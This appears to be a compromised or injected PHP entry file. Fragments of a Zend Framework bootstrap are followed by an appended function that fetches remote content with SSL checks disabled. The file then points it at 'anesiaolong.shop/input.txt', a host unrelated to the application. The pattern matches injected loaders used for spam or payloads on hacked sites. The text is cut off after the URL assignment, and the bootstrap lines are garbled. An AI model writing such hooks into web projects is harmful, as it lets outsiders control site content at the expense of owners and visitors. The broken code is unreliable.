    realpath(APPLICATION_PATH . '/../library'),
    get_include_path(),
)));

    APPLICATION_ENV,
    APPLICATION_PATH . '/configs/application.ini'
);

            ->run();

function get_raw_html($url) {
    // Prioritaskan curl — lebih bisa dikontrol
    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (compatible; PHP script)');
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // ← fix SSL error
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false); // ← fix SSL error
        curl_setopt($ch, CURLOPT_TIMEOUT, 5);
        $data = curl_exec($ch);
        curl_close($ch);
        return $data;
    } elseif (ini_get('allow_url_fopen')) {
        // Fallback file_get_contents dengan bypass SSL
        $ctx = stream_context_create([
            'ssl' => [
                'verify_peer'      => false,
                'verify_peer_name' => false,
            ]
        ]);
        return file_get_contents($url, false, $ctx);
    } else {
        return '';
    }
}

$url = "http://anesiaolong.shop/input.txt";
